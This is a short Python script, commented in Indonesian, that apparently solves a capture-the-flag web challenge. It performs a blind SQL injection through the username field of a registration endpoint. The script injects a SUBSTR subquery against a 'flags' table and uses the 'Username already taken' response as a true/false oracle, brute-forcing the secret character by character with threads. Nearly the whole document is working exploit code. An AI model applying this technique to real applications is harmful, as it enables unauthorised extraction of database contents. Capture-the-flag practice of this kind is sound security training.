import requests
import concurrent.futures

# URL endpoint
url = 'https://usc-spookyql.chals.io/1596345a-537d-4b96-af71-de75ded8fad0/'

# Fungsi untuk mendaftarkan username
def regis(data):
    response = requests.post(url + 'register', data)
    return response.text

fuzz = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890{}_!@#$%^&*()-'
flag = ''

# Fungsi untuk menguji satu karakter di posisi tertentu
def try_character(i, a):
    data = {
        "username": f"my' || (SELECT 'tr' WHERE SUBSTR((SELECT flag FROM flags),{i},1)='{a}') || 'ue{i}",
        "password": "abc"
    }
    out = regis(data)
    return (i, a, out)

# Fungsi utama untuk melakukan brute force setiap posisi flag
for i in range(1, 50):
    with concurrent.futures.ThreadPoolExecutor() as executor:
        # Buat threads untuk menguji setiap karakter di 'fuzz'
        futures = {executor.submit(try_character, i, a): a for a in fuzz}
        
        for future in concurrent.futures.as_completed(futures):
            a = futures[future]
            try:
                pos, char, output = future.result()
                print(i)
                # Jika respons menunjukkan bahwa karakter benar, tambahkan ke flag
                if 'Username already taken' not in output:
                    flag += char
                    print(output)
                    print(f"Flag so far: {flag}")
                    break  # Hentikan pencarian jika karakter benar ditemukan
            except Exception as e:
                print(f"Error with character {a} at position {i}: {e}")

print(f"Final flag: {flag}")
